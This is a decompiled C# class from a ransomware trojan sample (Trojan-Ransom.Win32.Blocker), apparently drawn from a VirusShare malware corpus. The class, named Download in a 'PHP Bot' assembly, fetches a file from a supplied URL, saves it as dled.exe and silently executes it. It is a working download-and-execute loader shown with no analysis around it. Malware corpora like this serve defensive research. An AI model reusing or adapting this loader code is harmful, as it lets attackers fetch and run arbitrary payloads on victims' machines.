// Decompiled with JetBrains decompiler
// Type: PHP_Bot.Download
// Assembly: PHP Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A73DBBE-CCD6-4C8A-915B-72A41BF05981
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.dfxz-5587203fc5e9b0dd6b0d3d299a783862a2204a5dd7f175fb859be97a0e6568ae.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;

namespace PHP_Bot
{
  internal class Download
  {
    private void CompletedDownload(object obj, AsyncCompletedEventArgs e)
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.Arguments = "-o \"" + Config.Location + "\"";
      startInfo.FileName = "dled.exe";
      startInfo.UseShellExecute = false;
      try
      {
        Process.Start(startInfo);
      }
      catch
      {
      }
    }

    public Download(string url)
    {
      WebClient webClient = new WebClient();
      webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.CompletedDownload);
      webClient.DownloadFileAsync(new Uri(url), "dled.exe");
    }
  }
}
